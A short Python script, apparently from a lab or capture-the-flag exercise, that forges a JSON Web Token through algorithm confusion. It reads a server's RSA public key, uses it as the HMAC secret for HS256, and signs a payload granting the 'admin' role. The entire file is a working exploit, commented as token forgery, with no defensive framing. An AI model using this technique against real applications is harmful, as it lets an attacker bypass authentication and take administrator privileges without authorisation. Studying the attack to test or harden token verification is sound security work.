import jwt
import time

# Read public key
with open("src/keys/public.pem", "r") as f:
    public_key = f.read()

# Create payload
payload = {
    "user": "random_coord_applicant",
    "role": "admin",
    "exp": int(time.time()) + 3600
}

# Forge token using HS256
token = jwt.encode(
    payload,
    public_key,
    algorithm="HS256"
)

print(token)
